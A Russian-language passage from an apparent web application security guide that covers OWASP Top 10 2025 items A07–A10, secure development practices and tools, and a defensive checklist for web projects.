**Проявления:** нет защиты от подбора и credential stuffing; допускаются пароли из топ-1000; идентификатор сессии в URL; сессия не инвалидируется при выходе и смене пароля; предсказуемые токены сброса пароля с бесконечным сроком; MFA отсутствует или обходится.

**Защита:** MFA; проверка пароля по базам утечек (длина важнее «обязательного спецсимвола»); ограничение частоты и прогрессивные задержки; одинаковый ответ «неверный логин или пароль» — не подсказывать, что пользователь существует; новый идентификатор сессии после входа; короткоживущие одноразовые токены восстановления; готовые решения (Keycloak, OAuth 2.1 / OIDC) вместо самописных.

### A08. Software or Data Integrity Failures

**Суть:** приняли данные или код, не проверив, откуда они и не изменены ли.

**Проявления:** **небезопасная десериализация** (объект из недоверенного источника → выполнение кода); автообновление без проверки подписи; подключение скриптов с CDN без атрибута `integrity` (SRI); доверие к данным из cookie или скрытого поля формы без подписи; сборка из непроверенного источника.

**Защита:** цифровые подписи артефактов и обновлений; SRI для внешних скриптов; не десериализовать недоверенные данные (использовать JSON вместо нативной сериализации); проверка целостности в конвейере сборки; разделение сред.

### A09. Security Logging & Alerting Failures

**Суть:** атака идёт, и никто не знает. Медианное время обнаружения взлома по отрасли измеряется месяцами.

**Проявления:** не логируются входы, отказы в доступе, изменения прав; журналы только локально и перетираются; нет оповещений; **обратная проблема** — в журналы попадают пароли, токены и персональные данные; журналы без защиты от подделки (нарушение неотказуемости).

**Защита:** единый формат и централизованный сбор; логировать события безопасности с контекстом (кто, что, откуда, когда, результат); оповещения на аномалии (всплеск 401/403, вход из новой страны); хранение с защитой от изменения; план реагирования на инцидент и его проверка на учениях.

### A10. Mishandling of Exceptional Conditions

**Суть (новинка 2025):** система неверно ведёт себя, когда что-то пошло не так.

**Проявления:**

- Подробная трассировка стека и SQL-ошибка на экране пользователя (CWE-209) — подарок для разведки перед инъекцией.
- **Fail open** (CWE-636): при ошибке проверки прав доступ разрешается.
- Незакрытые ресурсы при исключении → исчерпание пула соединений → отказ в обслуживании.
- Многошаговая операция без отката: разрыв связи посередине перевода → деньги списаны, но не зачислены, либо зачислены дважды.
- Пустой `catch`, проглатывающий ошибку.

**Защита:** обрабатывать исключение там, где оно возникло, осмысленно; единый обработчик как страховка; **пользователю — общее сообщение, в журнал — детали**; транзакционность и полный откат; лимиты и квоты; тестировать «плохие» сценарии, а не только счастливый путь.

# 6. Безопасность как процесс

## 6.1 Shift left и SDL

**Безопасность нельзя «прикрутить» в конце.** Это не этап перед релизом, а свойство процесса.

![Схема 6. Стоимость исправления и сдвиг влево](06-sdl-shift-left.svg)

Стоимость исправления растёт примерно на порядок с каждым этапом. Отсюда «shift left» — сдвигаем проверки как можно раньше, к требованиям и проектированию.

## 6.2 Инструменты

- **SAST** — статический анализ исходного кода (Semgrep, SonarQube, CodeQL). Находит рано, но много ложных срабатываний.
- **DAST** — динамическое тестирование работающего приложения (OWASP ZAP, Burp Suite). Меньше ложных срабатываний, но нужен работающий стенд.
- **SCA** — анализ состава зависимостей (Dependabot, Trivy, OWASP Dependency-Check). Прямо про A03.
- **IAST / RASP**, **фаззинг** — промежуточные и специальные подходы.
- **Пентест и bug bounty** — люди, а не инструменты; находят логику, которую машина не видит.
- **WAF** — сетевой фильтр. Полезный слой эшелона, **но не замена исправлению кода**.

# Приложение В. Чек-лист безопасного веб-приложения

Минимум, который стоит проверять в собственных проектах.

**Ввод и вывод**

- [ ] Все параметры валидируются на сервере по белому списку
- [ ] Все запросы к БД параметризованы; нет конкатенации строк
- [ ] Вывод кодируется под контекст; `|safe` и `dangerouslySetInnerHTML` не используются без явного обоснования
- [ ] Загружаемые файлы проверяются по типу и размеру, сохраняются вне веб-корня, имя генерируется заново

**Доступ**

- [ ] Права проверяются на сервере, при каждом запросе, для каждого объекта
- [ ] Проверяется владение объектом, а не только факт входа
- [ ] Доступ запрещён по умолчанию
- [ ] Пользователь БД имеет минимально необходимые права

**Аутентификация и сессии**

- [ ] Пароли хранятся под Argon2id / bcrypt / scrypt с солью
- [ ] Есть ограничение частоты попыток входа
- [ ] Идентификатор сессии меняется после входа и уничтожается при выходе
- [ ] Cookie сессии имеет флаги `HttpOnly`, `Secure`, `SameSite`
- [ ] Токены сброса пароля одноразовые и короткоживущие

**Конфигурация и транспорт**

- [ ] HTTPS везде, включён HSTS
- [ ] Отладка и подробные ошибки выключены на проде
- [ ] Учётных записей и паролей по умолчанию нет
- [ ] Заголовки `Content-Security-Policy`, `X-Content-Type-Options` настроены
- [ ] Секреты и ключи не лежат в репозитории

**Зависимости**

- [ ] Версии зафиксированы, есть lock-файл
- [ ] Настроена автоматическая проверка зависимостей на известные CVE
- [ ] Заброшенные библиотеки выявлены и запланированы к замене

**Журналирование и отказы**

- [ ] Логируются входы, отказы в доступе, изменения прав и критичные операции
- [ ] В журналы не попадают пароли, токены и персональные данные
- [ ] При ошибке система закрывается, а не открывается
- [ ] Многошаговые операции откатываются целиком
- [ ] Пользователь видит общее сообщение об ошибке, детали уходят в журнал
